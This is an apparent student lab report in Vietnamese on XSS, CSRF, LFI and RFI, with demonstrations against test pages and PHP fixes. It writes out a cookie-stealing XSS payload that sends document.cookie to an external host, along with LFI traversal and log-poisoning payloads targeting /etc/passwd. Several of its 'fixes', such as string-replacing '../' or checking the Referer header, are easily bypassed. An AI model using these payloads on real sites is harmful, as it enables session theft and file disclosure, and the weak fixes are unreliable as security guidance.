# <div align="center"><p> XSS, CSRF, LFI, RFI </p></div>
 ## Họ và tên: Mai Thị Hoàng Yến
 ## Ngày báo cáo: Ngày 13/5/2022
 ### MỤC LỤC
 1. [XSS](#1)
 
     1.1 [Khái niệm XSS](#11)
      
     1.2 [Các kiểu khai thác XSS](#12)
 
     1.3 [Khi nào thì XSS sẽ xảy ra](#13)

     1.4 [Cách khắc phục XSS](#14)
      
     1.5 [Cách sử dụng XSS để đánh cắp cookies người dùng](#15)
 
     1.6 [Điều chỉnh các tham số header](#16)

     1.7 [Mô phỏng XSS đánh cắp phiên khi Login vào trang web. Cookie sẽ được điều hướng về 1 host dựng sẵn](#17)
      
     1.8 [Mô phỏng code XSS](#18)
 
     1.9 [Khắc phục code lỗi XSS](#19)
     
 2. [CSRF](#2) 

     2.1 [Khái niệm CSRF](#21)
      
     2.2 [Cách thức tấn công CSRF](#22)
 
     2.3 [Mô phỏng code lỗi CSRF](#23)

     2.4 [Khắc phục code lỗi CSRF](#24)
       
 3. [LFI](#3)

     3.1 [Khái niệm LFI](#31)
      
     3.2 [Cách thức tấn công LFI](#32)
 
     3.3 [Khác nhau giữa LFI, RFI và nguyên nhân](#33)

     3.4 [Cách khai thác](#34)

     3.3 [Mô phỏng code lỗi LFI](#35)

     3.4 [Khắc phục code lỗi LFI](#36)

  4. [RFI](#4)

     4.1 [Khái niệm RFI](#41)
      
     4.2 [Cách thức tấn công RFI](#42)
 
     4.3 [Mô phỏng code lỗi RFI](#43)

     4.4 [Khắc phục code lỗi RFI](#44)
 
 5. [Các hàm đã sử dụng](#5)
 
### Nội dung báo cáo 
#### 1. XSS <a name="1"></a>
<br> 1.1 Khái niệm XSS <a name="11"></a></br>
 - XSS là một lỗi bảo mật cho phép các hacker chèn các đoạn script nguy hiểm vào trong source code ứng dụng web. Nhằm thực thi các đoạn mã độc Javascript để chiếm phiên đăng nhập của người dùng.
 
<br> 1.2 Các kiểu khai thác XSS <a name="12"></a></br>

 <table align="center">
   <tr>
        <td align="center" ><b>Các kiểu tấn công XSS</b></td>
        <td align="center"><b>Khác nhau</b></td>
        
   </tr>
   <tr>
        <td ><b>Reflected XSS</b></td>
        <td ><b>mã độc hại xuất phát từ HTTP request chứ không lưu trên database</b></td>      
   </tr>
   <tr>
        <td ><b>Stored XSS</b></td>
        <td ><b>mã độc hại xuất phát từ database</b></td>      
   </tr>
   <tr>
        <td ><b>DOM Based XSS</b></td>
        <td ><b>lỗ hổng tồn tại trong mã máy khách chứ không phải máy chủ</b></td>      
   </tr>
 </table>
 
 - `Reflected XSS`: Reflected XSS là hình thức tấn công XSS được sử dụng nhiều nhất trong chiếm phiên làm việc của người dùng mạng. Qua đó, hacker đánh cắp các dữ liệu người dùng, chiếm quyền truy cập và hoạt động của họ trên website thông qua việc chia sẻ địa chỉ URL chứa mã độc và chờ nạn nhân cắn câu.
 - `Stored XSS`: Không giống như Reflected XSS, Stored XSS nhắm đến khá nhiều nạn nhân cùng lúc. Với hình thức tấn công này, hacker chèn các mã độc vào database thông qua những dữ liệu đầu vào như form, input, textarea…Khi người dùng mạng truy cập website và tiến hành những thao tác liên quan đến các dữ liệu đã lưu, mã độc lập tức hoạt động trên trình duyệt của người dùng. 
 - `DOM Based XSS`: Đây là một dạng kỹ thuật dùng để khai thác XSS dựa vào thay đổi HTML của tài liệu, nói cách khác là thay đổi các cấu trúc DOM. 
 
<br> 1.3 Khi nào thì XSS sẽ xảy ra <a name="13"></a></br>
 - Để một lỗi XSS xảy ra thì phải đáp ứng 2 điều kiện:
   -  Kẻ tấn công chèn các đoạn mã độc vào hệ thống web
   -  Người dùng truy cập vào trang web
   
<br> 1.4 Cách khắc phục XSS <a name="14"></a></br>
 - Chúng ta sẽ sử dụng các hàm sau đây để ngăn chặn xss:
   - Mã hóa HTML:
     - `htmlspecialchars`: sẽ chuyển đổi bất kỳ "ký tự đặc biệt HTML" nào thành các mã hóa HTML của chúng, có nghĩa là sau đó chúng sẽ không được xử lý dưới dạng HTML tiêu chuẩn. 
        - Ví dụ:
               
               `<?php echo '<div>' . htmlspecialchars($_GET['input']) . '</div>';`
     - `filter_input`: Hàm này được sử dụng để xác thực các biến từ các nguồn không an toàn, chẳng hạn như đầu vào của người dùng.
        - Ví dụ: 
               
               `echo '<div>' . filter_input(INPUT_GET, 'input', FILTER_SANITIZE_SPECIAL_CHARS) . '</div>';`
     - `htmlentities`: Cũng thực hiện tác vụ tương tự như htmlspecialchars () nhưng hàm này bao gồm nhiều thực thể ký tự hơn. Nó sẽ chuyển các kí tự thích hợp thành các kí tự HTML entiies(kí tự dùng để hiển thị các biểu tượng).
        - Ví dụ:
               
               `htmlentities($var, ENT_QUOTES | ENT_HTML5, $charset)`
   - Mã hóa URL:
     - `urlencode`: Chức năng để xuất các URL hợp lệ một cách an toàn. Mọi thông tin đầu vào độc hại sẽ được chuyển đổi thành tham số URL được mã hóa.
        - Ví dụ:
                
                `<?php $input = urlencode($_GET['input']);`
     - Chúng ta cũng có thể sử dụng bộ lọc `FILTER_SANITIZE_URL` trong hàm `filter_input` để mã hóa url.
        - Ví dụ: 
        
                `$input = filter_input(INPUT_GET, 'input', FILTER_SANITIZE_URL);`
   - `strip_tags`: Hàm này có tác dụng loại bỏ đi các ký tự html trong một string. Mặc dù strip_tags có thể loại bỏ các ký tự html cho data của chúng ta tuy nhiên nó chỉ xóa một số thẻ nhất định ngay cả khi thẻ đó là hợp lệ.
     - Ví dụ: 
              
              `<?php 
               $text = '<p>Test paragraph.</p><!-- Comment --> <a href="#fragment">Other text</a>'; 
               echo strip_tags($text, '<p><a>');`
   
   - `Addlashes `: Thêm một ký tự gạch chéo nhằm ngăn kẻ tấn công chấm dứt việc gán biến và thêm mã thực thi vào cuối.
   - `str_replace`: Trả về một chuỗi mới với tất cả các lần xuất hiện của một chuỗi con được thay thế bằng một chuỗi khác.
     - Ví dụ:
            
            ` $name = str_replace( '<script>', '', $_GET[ 'name' ] );`
   - `preg_replace`: Dùng để replace một chuỗi nào đó khớp với đoạn Regular Expression truyền vào. Hàm này có chức năng tương tự như str_replace nhưng có sự khác biệt là một bên dùng regex một bên không dùng.
     - Ví dụ:
            
            ` $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );`
   - `stripos`: Sẽ chỉ ra vị trí xuất hiện đầu tiên của chuỗi con nào đó trong chuỗi mà không phân biệt chữ hoa chữ thường. Hàm trả về số nguyên là vị trí xuất hiện đầu tiên của chuỗi con.
     - Ví dụ: 
           
           `if (stripos ($default, "<script") !== false)`
           
<br> 1.5 Cách sử dụng XSS để đánh cắp cookies người dùng <a name="15"></a></br>
 - Đầu tiên, hacker sẽ tạo một host để lưu trữ các cookies người dùng.
 - Tiếp theo sẽ chèn một đoạn script có chứa link host vào database của web server.
 - Sau đó, người dùng nhấn vào link host của hacker thì cookies của người dùng sẽ được hacker đánh cắp.
 - Cuối cùng, hacker lấy cookies người dùng để đánh cắp thông tin hoặc mạo danh người dùng.

<br> 1.6 Điều chỉnh các tham số header <a name="16"></a></br>
 - Chúng ta có thể điều chỉnh Header về các tham số sau để lọc tấn công XSS:
   - `1`: Bật tính năng lọc XSS. Tính năng này thường sẽ là mặc định trong trình duyệt chúng ta. Nếu phát hiện một cuộc tấn công XSS thì trình duyệt sẽ loại bỏ các phần không an toàn.
   - `1; mode=block`: Bật tính năng lọc XSS. Nếu có một cuộc tấn công XSS thay vì phát hiện như tham số `1` ở trên nó sẽ chặn luôn.
   - `1; report=<reporting-uri>`: Bật tính năng lọc XSS, phát hiện, loại bỏ các phần không an toàn và báo cáo vi phạm.

<br> 1.7 Mô phỏng XSS đánh cắp phiên khi Login vào trang web. Cookie sẽ được điều hướng về 1 host dựng sẵn <a name="17"></a></br>
 - Đầu tiên chúng ta sẽ tạo 2 file ` hacker.php` và `hacker.txt` rồi sau đó đẩy nó lên host. Đây sẽ là nơi hacker lưu trữ các cookie của người dùng. File ` hacker.php` dùng để lấy cookie rồi sau đó ghi nó vào trong file `hacker.txt`. Còn file ` hacker.txt` để lưu trữ cookies.

   ![image](https://user-images.githubusercontent.com/101852647/168440728-d10a800c-f460-4309-bfe4-990c00d1d502.png)

   ![image](https://user-images.githubusercontent.com/101852647/168441800-a3d5ad19-56c8-4853-b57e-f68fc38f7952.png)

 - Đẩy 2 file vừa tạo lên host.

   ![image](https://user-images.githubusercontent.com/101852647/168440818-1343ddd1-680d-4592-9fde-5f03b191cc31.png)

 - Bây giờ chúng ta cần một trang web dính lỗi xss để mô phỏng tấn công. Chúng ta sẽ đăng nhập với `username=test3` `password=12345678`.

   ![image](https://user-images.githubusercontent.com/101852647/168441057-8365b60e-29da-49ed-95dc-24c5e2b5ac8e.png)

 - Đây là màn hình sau khi đăng nhập.

   ![image](https://user-images.githubusercontent.com/101852647/168441084-b7079332-25b1-4032-a7f8-6bce96c7f1f4.png)

 - Tiếp theo chúng ta sẽ nhấn vào trang bình luận và sử dụng trang này để tấn công xss. Đây là giao diện trang bình luận.

   ![image](https://user-images.githubusercontent.com/101852647/168441129-653fd9ba-e6e9-472f-9527-9373cb778def.png)

 - Sau đó chúng ta sẽ kiểm tra xem là trang bình luận này có thể chèn các đoạn mã độc hay không bằng cách thử với dòng lệnh `<script>alert(\'hacker\')</script>`. Kết quả là đã chèn thành công.

   ![image](https://user-images.githubusercontent.com/101852647/168441254-a926e59e-0967-4096-8ef0-0a1db94099f2.png)

   ![image](https://user-images.githubusercontent.com/101852647/168441270-27de052b-d045-47de-9682-93810afdd3a4.png)

 - Tiếp theo chúng ta sẽ chèn câu lệnh `<a href=# onclick=\"document.location=\'https://testsitemapphp.000webhostapp.com/hacker.php?c=\'+escape(document.cookie);\">Hacker</a>` để đánh cắp cookies của nhiều người dùng.

   ![image](https://user-images.githubusercontent.com/101852647/168441356-0f723f7d-7195-4e05-a997-63c60ff460b3.png)

 - Ở hình bên dưới chúng ta sẽ thấy là sau khi thực hiện đoạn mã trên thì nó đã chèn được đoạn mã trên vào database và hiển thị trên màn hình cho chúng ta là hacker. 
 
   ![image](https://user-images.githubusercontent.com/101852647/168441484-a2065e21-2083-4d8d-8df7-6a48451c5b89.png)
 
 - Chỉ cần người dùng dùng nhấn vào bình luận hacker ở dạng link thì lập tức người dùng sẽ bị điều hướng đến một trang web của lưu trữ cookie của hacker mà không hay biết gì hết.
   
   ![image](https://user-images.githubusercontent.com/101852647/168441585-a5995f6d-e4c4-443a-b5f4-70b7f5334aac.png)

 - Khi bị điều hướng sang một trang web khác thì cookie của người dùng đã bị đánh cắp và lưu trữ trong file `hacker.txt`. Sau khi lấy được cookie người dùng thì hacker có thể sử dụng với nhiều mục đích khác như :mạo danh hoặc đánh cắp thông tin người dùng.

    ![image](https://user-images.githubusercontent.com/101852647/168441621-e2aa1f26-4e17-4f47-af97-43fb6290a522.png)

<br> 1.8 Mô phỏng code XSS <a name="18"></a></br>
- Đây là code lỗi XSS:

  ![image](https://user-images.githubusercontent.com/101852647/167766624-108c8ce9-20bb-4c73-9180-0599499ab63f.png)

- Đây là giao diện trang web XSS:

  ![image](https://user-images.githubusercontent.com/101852647/167766786-09500954-9b91-4efa-ac35-0a9c0bfcc6c2.png)
  
- Bây giờ chúng ta sẽ thử chèn một đoạn mã javascript `<script>alert(document.cookie)</script>` vào trong trường id để chiếm phiên người dùng.

  ![image](https://user-images.githubusercontent.com/101852647/167767151-092e3449-ab5f-477e-8a54-7ed29eda9928.png)
  
  ![image](https://user-images.githubusercontent.com/101852647/167767182-433f8669-1bfb-4649-8042-0ed4847a828b.png)

- Hoặc có thể chèn đoạn mã sau `<script>alert('hacker')</script>` để chèn vào trong Database.

  ![image](https://user-images.githubusercontent.com/101852647/167767634-9cb8f128-ee6c-4985-b19d-922d9a1b0973.png)
  
  ![image](https://user-images.githubusercontent.com/101852647/167767649-0781af62-0bd8-4d00-b2ba-f03b38b7ca95.png)

<br> 1.9 Khắc phục code XSS <a name="19"></a></br>
 - Đây là code khắc phục lỗi XSS:

   ![image](https://user-images.githubusercontent.com/101852647/167768472-d622c437-0863-497b-b52a-c5c2984a9f3b.png)

 - Đây là màn hình của web fix lỗi:

   ![image](https://user-images.githubusercontent.com/101852647/167768565-b27f20fa-a9ba-41ec-b60c-2cd1ff96b81c.png)

 - Thử chèn lại đoạn mã đã thực thi phía trên `<script>alert(document.cookie)</script>` và `<script>alert('hacker')</script>`.

   ![image](https://user-images.githubusercontent.com/101852647/167768683-02e5354e-27f4-4358-aabb-8cbe7be7520a.png)

   ![image](https://user-images.githubusercontent.com/101852647/167768738-0cef7b51-ecf2-4c8b-9235-752af6ddd39a.png)

   ![image](https://user-images.githubusercontent.com/101852647/167768787-ef7015ca-4070-403b-ae8d-075977648cee.png)

#### 2. CSRF <a name="2"></a>
<br> 2.1 Khái niệm CSRF <a name="21"></a></br>
 - CSRF là tấn công vào chứng thực request trên web thông qua việc sử dụng Cookies.
 
<br> 2.2 Cách thức tấn công CSRF <a name="22"></a></br>
 - CSRF là một kiểu tấn công gây sự nhầm lẫn tăng tính xác thực và cấp quyền của nạn nhân khi gửi một request giả mạo đến máy chủ. Vì thế một lỗ hổng CSRF ảnh hưởng đến các quyền của người dùng ví dụ như quản trị viên, kết quả là chúng truy cập được đầy đủ quyền.
 - Khi gửi một request HTTP, trình duyệt của nạn nhân sẽ nhận về Cookie. Các cookie thường được dùng để lưu trữ một session để định danh người dùng không phải xác thực lại cho mỗi yêu cầu gửi lên.
 - Nếu phiên làm việc đã xác thực của nạn nhân được lưu trữ trong một Cookie vẫn còn hiệu lực và nếu ứng dụng không bảo mật dễ bị tấn công CSRF. Kẻ tấn công có thể sử dụng CSRF để chạy bất cứ requets nào với ứng dụng web mà ngay cả trang web không thể phân biệt được request nào là thực hay giả mạo.
 
<br> 2.3 Mô phỏng code CSRF <a name="23"></a></br>
 - Đây là code lỗi CSRF:

   ![image](https://user-images.githubusercontent.com/101852647/168123625-a49403c8-81a8-4ac8-a6cd-206aceb85563.png)
   
 - Đây là giao diện trang web có lỗi CSRF:

   ![image](https://user-images.githubusercontent.com/101852647/168123848-5904fc0e-05b7-44cf-b7e5-2192dc244813.png)

   ![image](https://user-images.githubusercontent.com/101852647/168123935-c2bca24e-06e9-44d4-8586-b182244163ee.png)

 - Bây giờ để khai thác CSRF chúng ta sẽ thử thay đổi password `admin12345` và chúng ta đã thay đổi được mật khẩu:

   ![image](https://user-images.githubusercontent.com/101852647/168130981-f333efdd-8a12-4166-a9e0-73751696dd5d.png)
   
   ![image](https://user-images.githubusercontent.com/101852647/168131045-b600211d-4777-4ec9-a171-0cec00de2672.png)

 - Tiếp theo chúng ta sẽ mở mã nguồn trang web lên và copy form vào notepad Sau đó sẽ sửa chúng lại như hình bên dưới. Lưu với tên là `click.html`:

   ![image](https://user-images.githubusercontent.com/101852647/168131351-f8d7ecb8-9331-4fd9-8be7-83023310916f.png)

   ![image](https://user-images.githubusercontent.com/101852647/168134022-9d01d45d-16d5-4d71-9759-44919234aa07.png)

 - Mở trang web vừa tạo lên và dưới đây là giao diện của trang web:

   ![image](https://user-images.githubusercontent.com/101852647/168134193-7449704f-4c33-417f-8332-6cd02639ba46.png)

 - Sau khi click vào thì nó sẽ tự động thay đổi password chúng ta thành `hacker`:

   ![image](https://user-images.githubusercontent.com/101852647/168134416-8debcab6-6afa-43ca-be1e-d65988741fad.png)

 - Bây giờ chúng ta sẽ đăng nhập lại xem thử có đăng nhập thành công với password `hacker ` không.

   ![image](https://user-images.githubusercontent.com/101852647/168134758-b3ddfb73-bd12-43d9-aaf4-ba88568e01c2.png)

 - Sau khi chúng ta nhấn button đăng nhập thì nó trả về cho chúng ta trang chủ. Như vậy là chúng ta đã khai thác thành công rồi.

   ![image](https://user-images.githubusercontent.com/101852647/168134979-c60e3881-5fa1-4186-898e-94f41da73391.png)

<br> 2.4 Khắc phụ code CSRF <a name="24"></a></br>
 - Đây là code CSRF đã được fix. Ở đây sẽ sử dụng hàm `stripos` để kiểm tra điều kiện `if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )` . Nó sẽ kiểm tra xem trình tham chiếu http có trong tên máy chủ hay không và ngược lại. Nếu có thì nó sex tiếp tục:

   ![image](https://user-images.githubusercontent.com/101852647/168137750-5d4a6d87-93ba-4c60-a56f-6e121e02254e.png)

 - Sau khi fix xong chúng ta sẽ thử thay đổi password lại xem thử chúng ta có thay đổi được hay không. Nhập mật khẩu mới là `123345` và như chúng ta thấy thì đã thay đổi thành công.

  ![image](https://user-images.githubusercontent.com/101852647/168138079-f8f9d87d-52b2-456e-99bd-538a4512344a.png)

  ![image](https://user-images.githubusercontent.com/101852647/168138205-b2f141ee-a75b-49d3-897c-5497ba9c066a.png)

 - Tiếp theo chúng ta làm tương tự như ở phía trên mô phỏng code lỗi CSRF chúng ta sẽ copy form và sửa chúng trên notepad. 

  ![image](https://user-images.githubusercontent.com/101852647/168138615-a32112bd-995d-4a8f-acae-88ebafbcb1b5.png)

 - Mở trang web lên là click vào `change` nhưng rất tiếc là lần này chúng ta không thể thay đổi được password.

  ![image](https://user-images.githubusercontent.com/101852647/168139000-5a2ab595-b343-45e9-b7df-cd184191b005.png)

  ![image](https://user-images.githubusercontent.com/101852647/168138900-1d80ebf3-dc27-413b-a404-4b0621e97ca8.png)

#### 3. LFI <a name="3"></a>
<br> 3.1 Khái niệm LFI <a name="31"></a></br>
 - Local file inclustion (LFI) là kĩ thuật đọc file trong hệ thống , lỗi này xảy ra thường sẽ khiến website bị lộ các thông tin nhảy cảm như là passwd, php.ini, access_log,config.php…
 
<br> 3.2 Cách thức hoạt động LFI <a name="32"></a></br>
 - Tấn công Local file inclusion Lỗ hổng Local file inclusion nằm trong quá trình include file cục bộ có sẵn trên server. Khi đầu vào này không được kiểm tra, tin tặc có thể sử dụng những tên file mặc định và truy cập trái phép đến chúng, tin tặc cũng có thể lợi dụng các thông tin trả về trên để đọc được những tệp tin nhạy cảm trên các thư mục khác nhau bằng cách chèn các ký tự đặc biệt như “/”, “../”, “-“.
 
<br> 3.3 Khác nhau giữa LFI và RFI , nguyên nhân <a name="33"></a></br>
<table align="center">
   <tr>
        <td align="center" ><b>RFI</b></td>
        <td align="center"><b>LFI</b></td>
        
   </tr>
   <tr>
        <td ><b>Tải tệp từ bên ngoài</b></td>
        <td ><b>Tải các tệp cục bộ. Ví dụ như là etc/passwd</b></td>      
   </tr>
   <tr>
        <td ><b> Nếu PHP.INI có :allow_url_open=On, allow_url include = ON thì có thể thực hiện RFI</b></td>
        <td ><b> Nếu PHP.INI có :allow_url_open = OFF, allow_url include = ON thì không thể thực thi RFI mà chỉ có thể thực thi LFI </b></td>      
   </tr>
 </table>
 
 - Nguyên nhân: 
   - Lỗ hổng LFI xảy ra khi đầu vào người dùng chứa đường dẫn đến file bắt buộc phải include.
   - Lỗ hổng RFI xảy ra khi PHP cung cấp các hàm cho phép tấn công RFI: uire, require_once, include, include_once.
   
 <br> 3.4 Các cách khai thác <a name="34"></a></br>
  - Null-Byte: 
    - Nếu như code có dạng: `include($_GET['page'].".php");` thì khi ta thực hiện chèn `/etc/passwd` thì nó sẽ có dạng `/etc/passwd.php` để có thể khai thác thì chúng ta phải sử dụng Null-Byte để loại bỏ .php . Tuy nhiên, chỉ thực hiện được khi magic_quotes_gpc=Off.
  - Thực hiện file `httpd.conf` để có được thông tin về error_log, access_log, ServerName, DocumentRoot,...
    - Nếu bị dính lỗi về LFI hacker có thể đọc và có được thông tin về username và password được đặt ở trong file `.htaccess và .htpasswd` này.
  - Khai thác sử dụng log file: Khi đường dẫn chúng ta có dạng `?page=` thì trong error_log của Apache nó sẽ lưu thông tin về lỗi. Ví dụ: `- - [15/Jul/2009:17:54:01 +0700] "GET /index.php?page=%3C?%20echo%20phpinfo();%20?%3E HTTP/1.1" 200 492 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1) Gecko/20090624 Firefox/3.5"`. Khi ta thực hiện request thì hệ thống log sẽ ghi vào file log khi đó chúng ta có thể khai thác bằng cách nhập đường dẫn vào sau `?page=`.
  - Chèn PHP Script trong file JPEG: Chúng ta có thể thực hiện chèn PHP script vào phần comment của file JPEG và thực hiện upload ảnh lên server, nếu như server đó bị lỗi LFI thì có thể khai thác.
  - Thực hiện PHP Code trong file /proc: Có một file `/proc/self/environ` lưu thông tin về cấu hình mà nó đang thực thi trên file. Nếu như ta sử dụng Firefox để mở thì nó sẽ hiển thị thông tin liên quan đến Browser như là `HTTP_USER_AGENT` và `HTTP_REFERER`. Khi đó nếu website bị lỗi thì có thể thực hiện mã PHP và gộp file để thực thi mã PHP.
  - Mã hóa url. Ví dụ:`..%c0%af..%c0%af..%c0%afetc%c0%afpasswd `
  - Cắt bớt đường dẫn. Ví dụ:` Kiểm tra xem các kí tự cuối có phải là ".php" không `shellcode.php/.`
  - Lọc bỏ qua thủ thuật. Ví dụ: `?page=....//....//etc/passwd` hoặc duy trì đường dẫn ban đầu `/var/www/../../etc/passwd`.
  
<br> 3.5 Mô phỏng code LFI <a name="35"></a></br>
- Đây là code lỗi LFI:

  ![image](https://user-images.githubusercontent.com/101852647/168015234-3ff28878-8afa-4f35-9116-da7362f35dce.png)
  
- Đây là giao diện trang web có lỗi LFI:

  ![image](https://user-images.githubusercontent.com/101852647/167999472-495509d4-60b0-4848-ac9c-831dafe2775d.png)

- Để có thể thực hiện tấn công LFI thì chúng ta có thể thay đổi URL trông giống như sau:

  ![image](https://user-images.githubusercontent.com/101852647/168001508-e3f75bd3-8084-4f68-bd94-937761a1c639.png)
  
- Nếu trong trường hợp không lọc thích hợp, máy chủ sẽ hiển thị nội dung nhạy cảm của tệp /etc/passwd:

  ![image](https://user-images.githubusercontent.com/101852647/167999155-bced5b89-08d2-468b-8731-e806dbc20191.png)
  
<br> 3.6 Khắc phục lỗi LFI <a name="36"></a></br>
 - Đây là code khắc phục lỗi LFI. Chúng ta sẽ sử dụng hàm ` str_replace` để thay đổi một số ký tự `http://, https://, ../` trên url để các hacker không thể khai thác được:

   ![image](https://user-images.githubusercontent.com/101852647/168015562-1f783fb4-5d7f-4e70-82bc-e9d00f954095.png)

 - Trang web vẫn bình thường cho đến khi chúng ta chèn thêm `../../../../etc/paswd` thì nó sẽ không hiển thị nội dung của tệp /etc/passwd:

   ![image](https://user-images.githubusercontent.com/101852647/168018052-5df140bf-6e0f-4e00-a5da-6c44417fa015.png) 
   
    
#### 4. RFI <a name="4"></a>
<br> 4.1 Khái niệm RFI <a name="41"></a></br>
 - Remote File Inclusion cho phép kẻ tấn công nhúng một mã độc hại được tuỳ chỉnh trên trang web hoặc máy chủ bằng cách sử dụng các tập lệnh . RFI còn cho phép tải lên một tệp nằm trên máy chủ khác được chuyển đến dưới dạng hàm PHP ( include, include_once, require, or require_once)

<br> 4.2 Cách thức hoạt động RFI <a name="42"></a></br>
 - Lỗ hổng Remote file inclusion RFI cho phép tin tặc include và thực thi trên máy chủ mục tiêu một tệp tin được lưu trữ từ xa. Tin tặc có thể sử dụng RFI để chạy một mã độc trên cả máy của người dùng và phía máy chủ. Ảnh hưởng của kiểu tấn công này thay đổi từ đánh cắp tạm thời session token hoặc các dữ liệu của người dùng cho đến việc tải lên các webshell, mã độc nhằm đến xâm hại hoàn toàn hệ thống máy chủ. 
<br> 4.3 Mô phỏng code RFI <a name="43"></a></br>
- Đây là code lỗi RFI:

  ![image](https://user-images.githubusercontent.com/101852647/167880954-9c5c97bc-696f-45c9-b8e5-27daefb6140a.png)
  
- Đây là giao diện trang web có lỗi RFI:

  ![image](https://user-images.githubusercontent.com/101852647/167881253-e2227593-52ed-451b-9c46-37cfee3cfc88.png)

- Để có thể thực hiện tấn công RFI thì đầu tiên chúng ta thử nhúng các url vào trang web. Ví dụ như bây giờ chúng ta thử chúng url `http://www.google.com`. Kết quả bên dưới cho chúng ta thấy là trang web này cho phép tải lên các trang web khác. Vì vậy, mà chúng ta có thể lợi dụng lỗ hổng này để tải nhúng các lệnh php mà mình muốn lên trang web và thực thi lệnh đó.

 ![image](https://user-images.githubusercontent.com/101852647/167882234-c89a9ad9-faf0-4612-8889-220b72dc7e60.png)

- Tiếp theo chúng ta sẽ tạo một file `hacker.html ` với nội dung như sau:

  ![image](https://user-images.githubusercontent.com/101852647/167883519-80552706-8fa9-4125-8782-d5eb30cc9316.png)
  
- Bây giờ chúng ta thử nhúng file này vào trang web và thu được kết quả:

  ![image](https://user-images.githubusercontent.com/101852647/167883824-a0899ecc-4ebf-40dd-a9b5-66695d7fbaa3.png)
  
<br> 4.4 Khắc phục lỗi RFI <a name="44"></a></br>
 - Đây là code khắc phục lỗi RFI. Chúng ta sẽ sử dụng hàm ` str_replace` để thay đổi một số ký tự `http://, https://, ../` trên url để các hacker không thể khai thác được:

   ![image](https://user-images.githubusercontent.com/101852647/168013767-b5f6ae69-c584-4b23-968b-b49a771423c4.png)

 - Trang web vẫn bình thường cho đến khi chúng ta chèn thêm `http://www.google.com` thì nó sẽ thông báo lỗi:

   ![image](https://user-images.githubusercontent.com/101852647/168014384-a891fa29-9e61-4c90-a730-9d9994acbd07.png)
   
#### 5. Các hàm đã sử dụng <a name="5"></a>
 - `htmlspecialchars`: sẽ chuyển đổi bất kỳ "ký tự đặc biệt HTML" nào thành các mã hóa HTML của chúng, có nghĩa là sau đó chúng sẽ không được xử lý dưới dạng HTML tiêu chuẩn. 
 - `filter_input`: Hàm này được sử dụng để xác thực các biến từ các nguồn không an toàn, chẳng hạn như đầu vào của người dùng.
 - `htmlentities`: Cũng thực hiện tác vụ tương tự như htmlspecialchars () nhưng hàm này bao gồm nhiều thực thể ký tự hơn. Nó sẽ chuyển các kí tự thích hợp thành các kí tự HTML entiies(kí tự dùng để hiển thị các biểu tượng).
 - `urlencode`: Chức năng để xuất các URL hợp lệ một cách an toàn. Mọi thông tin đầu vào độc hại sẽ được chuyển đổi thành tham số URL được mã hóa.
 - `strip_tags`: Hàm này có tác dụng loại bỏ đi các ký tự html trong một string. Mặc dù strip_tags có thể loại bỏ các ký tự html cho data của chúng ta tuy nhiên nó chỉ xóa một số thẻ nhất định ngay cả khi thẻ đó là hợp lệ.
 - `Addlashes `: Thêm một ký tự gạch chéo nhằm ngăn kẻ tấn công chấm dứt việc gán biến và thêm mã thực thi vào cuối.
 - `str_replace`: Trả về một chuỗi mới với tất cả các lần xuất hiện của một chuỗi con được thay thế bằng một chuỗi khác.
 - `preg_replace`: Dùng để replace một chuỗi nào đó khớp với đoạn Regular Expression truyền vào. Hàm này có chức năng tương tự như str_replace nhưng có sự khác biệt là một bên dùng regex một bên không dùng.
 -  `stripos`: Sẽ chỉ ra vị trí xuất hiện đầu tiên của chuỗi con nào đó trong chuỗi mà không phân biệt chữ hoa chữ thường. Hàm trả về số nguyên là vị trí xuất hiện đầu tiên của chuỗi con.
